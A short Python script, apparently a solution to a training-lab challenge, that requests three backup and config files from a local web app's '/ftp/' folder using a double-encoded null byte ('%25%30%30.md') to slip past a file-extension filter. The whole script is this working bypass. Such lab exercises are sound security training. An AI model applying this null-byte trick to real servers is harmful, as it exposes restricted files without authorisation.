import requests
import sys

def send_get_request(url, cookie_value):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': cookie_value,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    }

    response = requests.get(url, headers=headers)
    print(f'Response from {url}:')
    print(response.text)
    print('')

if __name__ == '__main__':
    base_url = 'http://localhost:3000'

    cookie_value = sys.argv[1]  # Pobranie wartości Cookie z argumentu wywołania skryptu

    urls = [
        '/ftp/suspicious_errors.yml%25%30%30.md',
        '/ftp/package.json.bak%25%30%30.md',
        '/ftp/coupons_2013.md.bak%25%30%30.md'
    ]

    for url in urls:
        full_url = base_url + url
        send_get_request(full_url, cookie_value)